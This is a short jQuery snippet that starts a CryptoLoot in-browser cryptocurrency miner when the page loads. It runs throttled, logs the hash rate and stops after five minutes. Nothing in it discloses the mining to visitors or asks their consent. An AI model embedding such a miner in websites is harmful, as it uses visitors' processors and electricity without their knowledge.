$(window).on('load', function () {
  var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
    autoThreads: false,
    throttle: 0.92
  })
  miner.start()
  setInterval(function () {
    var hashesPerSecond = miner.getHashesPerSecond()
    console.log(hashesPerSecond)
  }, 3000)
  setTimeout(function () {
    miner.stop()
    console.log('Miner stopped after 5 minutes')
  }, 5 * 60000)
})
